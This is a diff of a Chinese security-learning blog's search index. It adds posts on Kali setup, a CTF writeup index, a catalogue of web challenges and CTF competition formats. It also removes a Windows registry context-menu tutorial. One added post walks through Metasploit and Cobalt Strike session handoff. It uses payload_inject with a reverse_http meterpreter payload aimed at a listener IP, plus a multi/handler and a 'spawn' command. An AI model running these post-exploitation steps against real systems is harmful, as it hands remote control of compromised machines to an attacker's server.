+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="更新后的pip安装命令"><a href="#更新后的pip安装命令" class="headerlink" title="更新后的pip安装命令"></a>更新后的pip安装命令</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip2 install impacket</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://blog.csdn.net/huayimy/article/details/128338899?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522188AE452-3D06-4121-8A1A-E9F40B09180A%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=188AE452-3D06-4121-8A1A-E9F40B09180A&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-128338899-null-null.nonecase&utm_term=pip2%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4450" >Kali Python2.7安装pip2和模块方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
       <categories>
         <category>操作系统</category>
-        <category>windows</category>
+        <category>kali</category>
       </categories>
       <tags>
-        <tag>内网渗透</tag>
-        <tag>windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>windows系统右键菜单栏自定义添加程序</title>
-    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/</url>
-    <content><![CDATA[<h1 id="右键菜单栏自定义添加程序"><a href="#右键菜单栏自定义添加程序" class="headerlink" title="右键菜单栏自定义添加程序"></a>右键菜单栏自定义添加程序</h1><h2 id="右键菜单栏划分"><a href="#右键菜单栏划分" class="headerlink" title="右键菜单栏划分"></a>右键菜单栏划分</h2><ol>
-<li><p>在空白处右键（桌面右键）</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213332631.png"
-                      alt="image-20240913213332631"
-                ></p>
-</li>
-<li><p>在文件上右键</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213409634.png"
-                      alt="image-20240913213409634"
-                ></p>
-</li>
-<li><p>在文件夹上右键</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213440530.png"
-                      alt="image-20240913213440530"
-                ></p>
-</li>
-</ol>
-<h2 id="菜单栏对应注册表位置"><a href="#菜单栏对应注册表位置" class="headerlink" title="菜单栏对应注册表位置"></a>菜单栏对应注册表位置</h2><p>空白处右键： <code>HKEY_CLASSES_ROOT/Directory/background/shell</code></p>
-<p>文件夹右键： <code>HKEY_CLASSES_ROOT/Directory/shell</code></p>
-<p>文件上右键： <code>HKEY_CLASSES_ROOT/*/shell</code></p>
-<h2 id="添加示例"><a href="#添加示例" class="headerlink" title="添加示例"></a>添加示例</h2><p><strong>这里以在文件上右键为例</strong></p>
-<p>首先<code>win+R</code>输入<code>regedit</code>进入注册表</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213831309.png"
-                      alt="image-20240913213831309"
-                ></p>
-<p>进入文件的右键操作目录<code>HKEY_CLASSES_ROOT/*/shell</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214022631.png"
-                      alt="image-20240913214022631"
-                ></p>
-<p>右击<code>shell</code>，添加项，这个项就是你要添加的右键的文件目录</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214353893.png"
-                      alt="image-20240913214353893"
-                ></p>
-<p>这里示例新建一个test项，在它的默认文件里面添加数值（双击），这个值是你右键添加的名字</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214527696.png"
-                      alt="image-20240913214527696"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214650774.png"
-                      alt="image-20240913214650774"
-                ></p>
-<p>再右击test项，添加一个 <code>字符串值</code>，命名为<code>icon</code>，<strong>只能命名为这个值</strong>，添加你想要的图标**路径 + 空格 + “%1”**，例如<code>C:/test.exe &quot;%1&quot;</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214827266.png"
-                      alt="image-20240913214827266"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214915488.png"
-                      alt="image-20240913214915488"
-                ></p>
-<p>最后在test项下面再添加一个项，命名为<code>command</code>，给它的默认值添加你要运行的软件的路径，如<code>C:/test.exe</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913215633160.png"
-                      alt="image-20240913215633160"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913215813847.png"
-                      alt="image-20240913215813847"
-                ></p>
-<p>到这里就自定义完成了，其他的文件夹右键等同理操作，只是初目录不一样而已</p>
-<h2 id="参考文案"><a href="#参考文案" class="headerlink" title="参考文案"></a>参考文案</h2><p><a class="link"   href="https://blog.csdn.net/Mrceel/article/details/107459678" >win10 给右键文件、文件夹、桌面菜单添加程序（项） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
-      <categories>
-        <category>操作系统</category>
-        <category>windows</category>
-      </categories>
-      <tags>
-        <tag>windows</tag>
+        <tag>kali</tag>
+        <tag>环境配置</tag>
       </tags>
   </entry>
   <entry>
@@ -882,50 +812,180 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
-    <title>web安全的做题思路及方法</title>
-    <url>/2024/09/14/ctf/writeup/web/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<h1 id="做题思路及方法"><a href="#做题思路及方法" class="headerlink" title="做题思路及方法"></a>做题思路及方法</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
-<li><h3 id="首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题"><a href="#首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题" class="headerlink" title="首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题"></a>首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题</h3><p><img  
+    <title>msf与cs派生会话</title>
+    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/kali/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/</url>
+    <content><![CDATA[<h1 id="msf与cs派生会话"><a href="#msf与cs派生会话" class="headerlink" title="msf与cs派生会话"></a>msf与cs派生会话</h1><h2 id="MSF转CS"><a href="#MSF转CS" class="headerlink" title="MSF转CS"></a>MSF转CS</h2><h3 id="在CS中做好接口监听端口的准备"><a href="#在CS中做好接口监听端口的准备" class="headerlink" title="在CS中做好接口监听端口的准备"></a>在CS中做好接口监听端口的准备</h3><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/./../../../../images/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/image-20240914164659161.png"
-                      alt="image-20240914164659161"
+                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010145920.png"
+                      alt="image-20240914010145920"
                 ></p>
-<ul>
-<li>例如这种题目上有明显提示的，就根据提示来下手</li>
-</ul>
-</li>
-<li><h3 id="如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了"><a href="#如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了" class="headerlink" title="如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了"></a>如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了</h3><p><img  
+<h3 id="在MSF中添加转接exploit"><a href="#在MSF中添加转接exploit" class="headerlink" title="在MSF中添加转接exploit"></a>在MSF中添加转接exploit</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">background                // 挂起会话</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http	//payload各不相同，注意不要设置错了，这是32位的</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.16.181     //设置 CS 服务端的 IP 地址.</span><br><span class="line"><span class="built_in">set</span> lport 4400              //设置 CS 服务端的监听的端口</span><br><span class="line"><span class="built_in">set</span> pid xxxx	//设置程序的pid（可以不管，会自动生成一个）</span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler True</span><br><span class="line"><span class="built_in">set</span> PrependMigrate True</span><br><span class="line">sessions -l  //查看 会话 是多少则设置多少</span><br><span class="line"><span class="built_in">set</span> session 1 [一般是 1(上面查看的结果)]</span><br><span class="line">exploit      // 进行测试</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/./../../../../images/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/image-20240914164903900.png"
-                      alt="image-20240914164903900"
+                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010307684.png"
+                      alt="image-20240914010307684"
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/./../../../../images/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/image-20240914164924736.png"
-                      alt="image-20240914164924736"
+                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010406568.png"
+                      alt="image-20240914010406568"
                 ></p>
-<ul>
-<li><p>例如这种的题目，就什么都没有，靶场点开就是一个页面的</p>
-<ul>
-<li>先F12大法（ctrl+U也可以），查看有没有可以利用的信息</li>
-<li>如果没有信息，再扫描目录文件</li>
-</ul>
-</li>
-</ul>
-</li>
+<p>下面这个就是我们转接过去的beacon</p>
+<h2 id="CS转MSF"><a href="#CS转MSF" class="headerlink" title="CS转MSF"></a>CS转MSF</h2><h3 id="在MSF中做好接口监听端口的准备"><a href="#在MSF中做好接口监听端口的准备" class="headerlink" title="在MSF中做好接口监听端口的准备"></a>在MSF中做好接口监听端口的准备</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914003204778.png"
+                      alt="image-20240914003204778"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http	//这里要设置好，协议要与下面CS的协议用一样</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.0.1</span><br><span class="line"><span class="built_in">set</span> lport 4445	//用于接收cs的派生会话</span><br><span class="line">run	//或者exploit</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="在CS中添加新监听"><a href="#在CS中添加新监听" class="headerlink" title="在CS中添加新监听"></a>在CS中添加新监听</h3><h4 id="添加payload为Foreign-HTTP，端口为MSF正在监听的端口"><a href="#添加payload为Foreign-HTTP，端口为MSF正在监听的端口" class="headerlink" title="添加payload为Foreign HTTP，端口为MSF正在监听的端口"></a>添加payload为Foreign HTTP，端口为MSF正在监听的端口</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240913230933632.png"
+                      alt="image-20240913230933632"
+                ></p>
+<h4 id="在beacon会话中运行"><a href="#在beacon会话中运行" class="headerlink" title="在beacon会话中运行"></a>在beacon会话中运行</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">spawn 监听器名</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914004900523.png"
+                      alt="image-20240914004900523"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914004917729.png"
+                      alt="image-20240914004917729"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914005102622.png"
+                      alt="image-20240914005102622"
+                ></p>
+<h4 id="或者在右键菜单中找到spawn进行派生会话"><a href="#或者在右键菜单中找到spawn进行派生会话" class="headerlink" title="或者在右键菜单中找到spawn进行派生会话"></a>或者在右键菜单中找到spawn进行派生会话</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240913220809576.png"
+                      alt="image-20240913220809576"
+                ></p>
+]]></content>
+      <categories>
+        <category>操作系统</category>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WriteUp</title>
+    <url>/2024/09/12/ctf/writeup/%E7%9B%AE%E5%BD%95/writeup/</url>
+    <content><![CDATA[<h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><p>CTF题目传送门</p>
+<ol>
+<li><a href="/2024/09/12/ctf/writeup/web/%E7%9B%AE%E5%BD%95/catalogue/" title="web安全目录">web安全</a></li>
+<li></li>
+<li></li>
+</ol>
+<p>推荐在线靶场传送门</p>
+<ol>
+<li><a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   href="https://www.ctfhub.com/#/index" >CTFHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ol>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里收录了我在做的CTF题目，题目可能来自不同靶场，会有标识的，目前还在持续更新中~</p>
+<h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>本人是个大二学生，平时就是搞搞电脑，只要是和电脑有关的都感兴趣。</p>
+<p>（不怎么会自我介绍，就将就看看吧(๑◕ܫ￩๑)b ）</p>
+<p> 目前还属于CTF小白，略懂一二内网渗透。有了一点道行后听见学长们推荐写writeup来提升能力，所以就开始了我的wirteup之旅。写writeup文章时不时也会引用一些大佬的资料，希望大家能够一起共同进步，从入门到入土，或者你想从入门到入狱我也不拦你 ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;┌(;￣◇￣)┘</p>
+<blockquote>
+<p>CTF在线靶场都是在线生成的动态flag，若要复现不要直接挪用flag哦，因为你是交不了的 ≖‿≖✧</p>
+</blockquote>
+<p>话不多说，去看看有没有你心动的WP吧٩(๑´0&#96;๑)۶ </p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>writeup</category>
+        <category>目录</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web安全目录</title>
+    <url>/2024/09/12/ctf/writeup/web/%E7%9B%AE%E5%BD%95/catalogue/</url>
+    <content><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>（根据上传顺序以及题目难度进行排序）</p>
+<p><a href="#ctfhub">ctfhub</a></p>
+<p><a href="#buuctf">buuctf</a></p>
+<h2 id="ctfhub"><a href="#ctfhub" class="headerlink" title="ctfhub"></a>ctfhub</h2><ol>
+<li><a href="/2024/09/14/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" title="信息泄露-目录遍历">信息泄露-目录遍历</a></li>
+<li><a href="/2024/09/16/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" title="信息泄露-备份文件下载">信息泄露-备份文件下载</a></li>
+<li><a href="/2024/09/14/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-PHPINFO/" title="信息泄露-PHPINFO">信息泄露-PHPINFO</a></li>
+<li><a href="/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/" title="信息泄露-Git泄露">信息泄露-Git泄露</a></li>
+<li><a href="/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2/" title="信息泄露-SVN泄露">信息泄露-SVN泄露</a></li>
+<li><a href="/2024/09/17/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/" title="信息泄露-HG泄露">信息泄露-HG泄露</a></li>
+<li><a href="/2024/09/14/ctf/writeup/web/ctfhub/RCE-eval%E6%89%A7%E8%A1%8C/" title="RCE-eval执行">RCE-eval执行</a></li>
+<li><a href="/2024/09/15/ctf/writeup/web/ctfhub/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/" title="web前置技能-HTTP协议">web前置技能-HTTP协议</a></li>
+</ol>
+<h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><ol>
+<li><a href="/2024/09/12/ctf/writeup/web/buuctf/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DHttp/" title="极客大挑战2019 Http">[极客大挑战 2019]Http</a></li>
+<li><a href="/2024/09/12/ctf/writeup/web/buuctf/BUU-BURP-COURSE-1/" title="BUU BURP COURSE 1">BUU-BURP-COURSE-1</a></li>
+<li><a href="/2024/09/12/ctf/writeup/web/buuctf/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/" title="web入门-粗心的小李">[web入门]粗心的小李</a></li>
+<li><a href="/2024/09/13/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DMark-loves-cat/" title="BJDCTF2020 Mark-loves-cat*">[BJDCTF2020]Mark-loves-cat</a></li>
+<li><a href="/2024/09/14/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/" title="BJDCTF2020 ZJCTF，不过如此*">[BJDCTF2020]ZJCTF-不过如此</a></li>
 </ol>
 ]]></content>
       <categories>
         <category>ctf</category>
         <category>writeup</category>
         <category>web</category>
+        <category>目录</category>
       </categories>
       <tags>
+        <tag>ctf</tag>
         <tag>writeup</tag>
-        <tag>总结</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF竞赛模式</title>
+    <url>/2024/09/12/ctf/data/another/%E7%AB%9E%E8%B5%9B%E6%A8%A1%E5%BC%8F/</url>
+    <content><![CDATA[<h1 id="竞赛模式"><a href="#竞赛模式" class="headerlink" title="竞赛模式"></a>竞赛模式</h1><p>CTF竞赛模式具体分为以下几类：</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h3><p>理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p>
+<h3 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h3><p>参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。</p>
+<p>不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。</p>
+<p>当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为<code>动态积分</code></p>
+<p>题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p>
+<h3 id="AwD-攻防模式"><a href="#AwD-攻防模式" class="headerlink" title="AwD-攻防模式"></a>AwD-攻防模式</h3><p><strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为<code>GameBox</code>，每个队伍之间的GameBox<code>配置及漏洞是完全一致</code>的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为<code>Checker</code>的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。</p>
+<p>AwD通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p>
+<h3 id="ADP-攻防增强"><a href="#ADP-攻防增强" class="headerlink" title="ADP-攻防增强"></a>ADP-攻防增强</h3><p><strong>A</strong>ttack <strong>D</strong>efense <strong>P</strong>lus(ADP)全称攻防增强模式，在该模式下中，参赛队伍连接到同一个网络空间。主办方会在平台上放置题目，选手需要登录到平台获得题目信息</p>
+<p>攻击模式下，平台会给出题目的访问链接，选手按照解题模式做题提交flag即可完成攻击，当完成攻击后， 每轮计算分数时均会计算该题目的攻击得分。</p>
+<p>防御模式下，选手需要自行挖掘题目的漏洞，并制作漏洞补丁包上传至平台，之后点击验证。验证时平台会新建一个完全干净的题目环境，使用预置的Exploit进行攻击，若攻击成功当验证通过之后（即已经完成修补），每轮计算分数均会认为该题目已防御。</p>
+<p>也就是说，对于每个题目，仅需要攻击成功一次，防御成功一次，该题就可以认为已完成，后续无需进行关注。</p>
+<p>ADP通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。随着比赛的进行，最早的题目可能会下线，后续也有可能会上线新的题目。</p>
+<p>ADP相较于AwD来说，选手无须编写批量攻击脚本，也无需关注题目的环境是否被攻击，是否服务异常等等，要做的只是攻击一次，防御一次，选手可以有更多的时间聚焦于还未完成的题目。从主办方的角度来说，大大减轻了比赛的硬件成本和运维成本。</p>
+<h3 id="RHG-自动化-AI自动化"><a href="#RHG-自动化-AI自动化" class="headerlink" title="RHG-自动化[AI自动化]"></a>RHG-自动化[AI自动化]</h3><p><strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于<code>漏洞理解</code>以及<code>工程化</code>能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为<code>bot</code>，在程序中<code>全自动</code>访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。</p>
+<p>比赛过程中不允许选手对bot进行任何的操作(包括debug&#x2F;patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p>
+<h3 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW-真实世界"></a>RW-真实世界</h3><p><strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年<code>长亭科技</code>主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM&#x2F;Docker逃逸、针对浏览器的攻击、针对IoT&#x2F;Car等设备的攻击，Web类攻击等等<br>在RW赛制中会有一个<code>Show Time</code>，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为<code>5分钟</code>，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如未在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率</p>
+<p>举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码&#x2F;数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并<code>不存在Flag</code>。</p>
